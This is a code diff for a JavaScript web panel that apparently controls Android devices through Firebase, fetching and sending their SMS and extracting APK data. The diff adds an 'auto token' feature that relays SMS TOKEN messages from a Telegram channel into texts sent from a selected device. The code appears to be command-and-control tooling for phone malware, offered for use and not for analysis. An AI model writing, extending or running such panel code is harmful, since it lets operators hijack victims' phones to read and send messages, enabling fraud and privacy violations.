@@ -2,7 +2,7 @@ var SEND_SMS_URL='nya.php?rebel_send_sms=1';
 var FETCH_SMS_URL='nya.php?rebel_fetch_sms=1';
 var APK_EXTRACT_URL='nya.php?rebel_apk_extract=1';
 var FIREBASE_API_URL='nya.php?rebel_firebase_api=1';
-var SMS_TOKEN_URL='sex.php?sms_token_api=1';
+var SMS_TOKEN_URL='nya.php?rebel_sms_token_api=1';
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
@@ -2076,8 +2076,10 @@ function rebelApkHeaders(){
   return h;
 }
 
-/* AUTO TOKEN (via sex.php API) */
+/* AUTO TOKEN (Telegram channel SMS TOKEN → auto send via Firebase) */
 var _autoTokenOn=false;
+var _smsTokenLog=[];
+var _autoTokenConfig={};
 function smsTokenFetch(body){
   var hdr={'Content-Type':'application/json'};
   var apk=rebelApkHeaders();
@@ -2085,22 +2087,105 @@ function smsTokenFetch(body){
   return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
     .then(function(r){return r.json();});
 }
+function renderAutoTokenLog(log){
+  var el=document.getElementById('autoTokenLog');
+  if(!el)return;
+  var rows=log||_smsTokenLog||[];
+  if(!rows.length){el.innerHTML='<div class="empty-mini">No auto-token activity yet</div>';return;}
+  el.innerHTML=rows.map(function(row){
+    var ok=row.ok?'ok':'bad';
+    var when=row.time||'';
+    var msg=String(row.message||'').slice(0,60);
+    return '<div class="token-log '+ok+'">'+(when?esc(when)+' · ':'')+'→ '+esc(row.to||'?')+' · '+esc(msg)+(row.error&&!row.ok?' · '+esc(row.error):'')+'</div>';
+  }).join('');
+}
+function updateAutoTokenUi(cfg){
+  _autoTokenConfig=cfg||_autoTokenConfig||{};
+  var devEl=document.getElementById('autoTokenDevice');
+  var stEl=document.getElementById('autoTokenStatus');
+  var toggle=document.getElementById('autoTokenToggle');
+  if(toggle)toggle.classList.toggle('on',!!_autoTokenOn);
+  if(devEl){
+    if(_autoTokenConfig.device_id){
+      devEl.textContent=(_autoTokenConfig.fb_name?_autoTokenConfig.fb_name+' · ':'')+_autoTokenConfig.device_id.slice(0,12)+'…';
+    }else{
+      devEl.textContent='Home se device select karo → Set Device';
+    }
+  }
+  if(stEl){
+    stEl.textContent=_autoTokenOn
+      ?('✅ ON · '+(_autoTokenConfig.fb_name||'Firebase')+' · Sim '+(_autoTokenConfig.sim||1))
+      :'⏸ OFF · Telegram channel me SMS TOKEN format chahiye';
+  }
+}
 function loadAutoTokenState(){
   smsTokenFetch({action:'get'}).then(function(d){
-    if(d&&d.ok&&d.config){_autoTokenOn=!!d.config.enabled;document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);}
+    if(!d||!d.ok)return;
+    if(d.config){
+      _autoTokenOn=!!d.config.enabled;
+      _autoTokenConfig=d.config;
+    }
+    _smsTokenLog=d.log||[];
+    updateAutoTokenUi(d.config);
+    renderAutoTokenLog(_smsTokenLog);
   }).catch(function(){});
+}
+function refreshAutoTokenLog(){
+  smsTokenFetch({action:'get'}).then(function(d){
+    if(d&&d.ok){
+      _smsTokenLog=d.log||[];
+      if(d.config)_autoTokenConfig=d.config;
+      renderAutoTokenLog(_smsTokenLog);
+      toast('Log updated',true);
+    }
+  }).catch(function(){toast('Log refresh failed',false);});
+}
+function openAutoTokenSheet(){
+  loadAutoTokenState();
+  document.getElementById('tokenSheetBg').classList.add('open');
+  document.getElementById('autoTokenSheet').classList.add('open');
+}
+function closeAutoTokenSheet(){
+  document.getElementById('tokenSheetBg').classList.remove('open');
+  document.getElementById('autoTokenSheet').classList.remove('open');
 }
 function toggleAutoToken(){
   _autoTokenOn=!_autoTokenOn;
-  document.getElementById('autoTokenToggle').classList.toggle('on',_autoTokenOn);
-  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(){toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);});
+  var toggle=document.getElementById('autoTokenToggle');
+  if(toggle)toggle.classList.toggle('on',_autoTokenOn);
+  smsTokenFetch({action:'save',enabled:_autoTokenOn}).then(function(d){
+    if(d&&d.ok&&d.config)_autoTokenConfig=d.config;
+    if(d&&d.log)_smsTokenLog=d.log;
+    updateAutoTokenUi(_autoTokenConfig);
+    toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);
+  }).catch(function(){toast('Auto token save failed',false);});
 }
 function useSelForAutoToken(){
-  var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
+  var d=getSelDev();
+  if(!d){toast('Pehle koi device select karo (card tap karo)',false);return;}
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase missing',false);return;}
-  smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
-    toast('Auto SMS device set',true);
+  var body={
+    action:'save',
+    enabled:_autoTokenOn,
+    device_id:d.rawId,
+    database_url:inst.restUrl,
+    fb_name:inst.name,
+    auth_key:getFbAuthKey(inst),
+    schema:inst.schema||'rabel',
+    device_node:d.deviceNode||'clients',
+    sim:_sendSimSlot||1
+  };
+  smsTokenFetch(body).then(function(res){
+    if(!res||!res.ok){toast('Auto token save failed',false);return;}
+    if(res.config){
+      _autoTokenConfig=res.config;
+      _autoTokenOn=!!res.config.enabled;
+    }
+    if(res.log)_smsTokenLog=res.log;
+    updateAutoTokenUi(_autoTokenConfig);
+    renderAutoTokenLog(_smsTokenLog);
+    toast('Auto SMS device set: '+d.displayPhone,true);
   }).catch(function(){toast('Auto token save failed',false);});
 }
 
@@ -2118,6 +2203,7 @@ document.addEventListener('visibilitychange',function(){
     loadSmsCacheFromStorage();
     ensureActiveFbValid();
     fetchAllData().catch(function(){toast('Sync failed — check Firebase',false);});
+    loadAutoTokenState();
   }catch(e){console.error(e);}
 })();
 setInterval(function(){
